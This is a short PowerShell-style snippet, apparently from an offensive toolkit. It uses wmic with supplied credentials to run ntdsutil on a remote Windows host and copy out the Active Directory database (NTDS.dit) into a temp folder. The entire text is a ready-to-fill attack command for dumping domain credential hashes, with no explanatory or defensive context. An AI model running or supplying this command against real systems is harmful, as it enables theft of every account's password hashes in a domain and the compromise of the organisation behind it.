# Remote
$node = ""
$userName = ""
$pwd = ""
wmic /node:$node /user:$userName /password:$pwd process call create "cmd.exe /c mkdir C:\Windows\Temp\tmp & ntdsutil \"ac i ntds\" ifm \"create full C:\Windows\Temp\tmp\" qq" 